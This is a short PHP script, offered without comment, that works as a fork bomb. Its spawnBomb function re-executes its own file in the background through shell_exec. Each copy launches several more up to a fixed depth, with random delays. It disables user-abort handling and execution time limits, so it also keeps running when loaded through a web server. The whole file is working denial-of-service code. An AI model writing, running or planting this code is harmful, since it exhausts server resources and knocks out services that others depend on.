<?php
ignore_user_abort(true);
set_time_limit(0);

function spawnBomb($depth = 0) {
    if ($depth > 5) return;

    $self = __FILE__;
    $cmd = "php $self " . ($depth + 1) . " > /dev/null 2>&1 &";

    for ($i = 0; $i < rand(3, 7); $i++) {
        usleep(rand(10000, 500000));
        shell_exec($cmd);
    }
}

if (php_sapi_name() === 'cli') {
    $depth = isset($argv[1]) ? intval($argv[1]) : 0;
    spawnBomb($depth);
} else {
    spawnBomb();
}
